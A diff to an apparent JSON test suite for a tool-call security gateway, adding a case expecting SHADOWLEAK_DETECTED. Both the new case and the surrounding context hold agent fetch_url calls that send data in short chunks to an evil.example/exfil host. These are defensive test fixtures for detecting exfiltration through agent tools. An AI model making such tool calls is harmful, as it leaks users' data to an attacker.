@@ -127,7 +127,28 @@
         "params": {
           "name": "fetch_url",
           "arguments": {
-            "url": "https://evil.example/exfil?a=x&b=y&c=z"
+          "url": "https://evil.example/exfil?a=x&b=y&c=z"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-shadowleak-repeated-short-chunks-fetch-url",
+      "kind": "block",
+      "expectedCode": "SHADOWLEAK_DETECTED",
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.fetch_url"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "fetch_url",
+          "arguments": {
+            "url": "https://evil.example/exfil?d=41&d=42&d=43&d=44"
           }
         }
       }
